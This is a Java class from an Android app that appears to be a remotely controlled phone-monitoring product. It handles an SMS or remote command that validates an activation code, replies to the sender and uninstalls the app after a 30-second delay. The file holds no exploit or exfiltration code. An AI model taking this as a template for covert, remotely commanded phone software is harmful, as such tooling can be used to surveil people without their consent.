package com.vvt.remotecommandmanager.processor.activationandinstallation;

import android.os.SystemClock;

import com.daemon_bridge.SendUninstallCommand;
import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class UninstallApplicationProcessor extends RemoteCommandProcessor {
	
	private static final String TAG = "UninstallApplicationProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private LicenseInfo mLicenseInfo;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private StringBuilder mReplyMessageBuilder;
	

	public UninstallApplicationProcessor(AppContext appContext,
			FxEventRepository eventRepository,LicenseInfo licenseInfo) {
		super(appContext, eventRepository);

		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # Check licence ...");
		if(mLicenseInfo.getLicenseStatus() != LicenseStatus.DEACTIVATED) {
			validateRemoteCommandData(commandData);
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # Add prefix ...");
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
	
		if(commandData.isSmsReplyRequired()) {
			if(LOGV) FxLog.v(TAG, "doProcessCommand # Sms Reply Required ...");
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append("Application is now being uninstalled.");
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			FxLog.v(TAG, "doProcessCommand # call Uninstall...");
			uninstall();
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			 
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append("Internal error. Can not uninstall product.");
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	protected void uninstall() {
		if(LOGV) FxLog.v(TAG, "uninstall # ENTER ...");
		//uninstall without check activation code
		Thread trd = new Thread(new Runnable() {
			
			@Override
			public void run() {
				if(LOGD) FxLog.d(TAG,"Uninstall product in 30 sec ...");
				SystemClock.sleep(30000);
				SendUninstallCommand sendUninstallCommand = new SendUninstallCommand();
				sendUninstallCommand.execute();
			}
		});
		trd.start();
		if(LOGV) FxLog.v(TAG, "uninstall # EXIT ...");
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		// Command should only have 1 arguments.
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if (commandData.getArguments().size() < 1) {
				throw new InvalidCommandFormatException();
			}

			// if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}

	}

}
